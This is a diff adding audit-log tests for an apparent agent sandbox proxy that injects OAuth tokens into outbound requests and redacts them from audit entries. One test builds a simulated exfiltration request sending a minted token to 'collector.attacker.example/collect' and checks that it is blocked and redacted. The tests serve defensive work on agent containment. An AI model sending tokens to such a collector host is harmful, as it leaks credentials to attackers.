@@ -351,6 +351,56 @@ class TestWebSocketCapture:
         assert entry["ws_messages"][0]["data"] == f"exfil {_PH}"
 
 
+# ── Audit log ────────────────────────────────────────────
+
+
+def _audit_lines(capsys) -> list[dict]:
+    """The audit entries printed to stderr (the journal's copy)."""
+    return [json.loads(line) for line in capsys.readouterr().err.splitlines()
+            if line.startswith("{")]
+
+
+class TestAudit:
+    def test_minted_token_injected_into_url_not_in_audit(
+            self, addon_mod, monkeypatch, tmp_path, sa_keys, capsys):
+        inj = _injector(addon_mod, monkeypatch, tmp_path, sa_keys[0],
+                        inject_body=True)
+        addon = _addon(addon_mod, inj, tmp_path)
+        flow = _flow()
+        flow.request.url = (
+            f"https://{_HOST}/gmail/v1/users/me/profile?access_token={_PH}")
+        with patch(_URLOPEN, return_value=_oauth(_TOKEN_A)):
+            asyncio.run(addon.request(flow))
+        # On the wire: the minted token, in the URL.
+        assert flow.request.url.endswith(f"access_token={_TOKEN_A}")
+
+        [entry] = _audit_lines(capsys)
+        assert _TOKEN_A not in json.dumps(entry)
+        assert entry["secrets_injected"] == ["GOOGLE_SA_KEY"]
+        assert entry["url"] == (
+            f"https://{_HOST}/gmail/v1/users/me/profile?access_token={_PH}")
+
+    def test_blocked_minted_token_in_url_not_in_audit(
+            self, addon_mod, monkeypatch, tmp_path, sa_keys, capsys):
+        inj = _injector(addon_mod, monkeypatch, tmp_path, sa_keys[0])
+        with patch(_URLOPEN, return_value=_oauth(_TOKEN_A)):
+            inj.rules[0].transform_fn()
+        addon = _addon(addon_mod, inj, tmp_path)
+        # The 403 is a stub here (http.Response.make), not serializable.
+        addon._capture = None
+        flow = _flow(host="collector.attacker.example",
+                     path=f"/collect?t={_TOKEN_A}")
+        asyncio.run(addon.request(flow))
+        assert flow.metadata.get("agentcage_blocked") is True
+
+        [entry] = _audit_lines(capsys)
+        assert _TOKEN_A not in json.dumps(entry)
+        assert entry["decision"] == "blocked"
+        assert entry["path"] == f"/collect?t={_PH}"
+        assert entry["url"] == (
+            f"https://collector.attacker.example/collect?t={_PH}")
+
+
 # ── Injection policy ─────────────────────────────────────
 
 
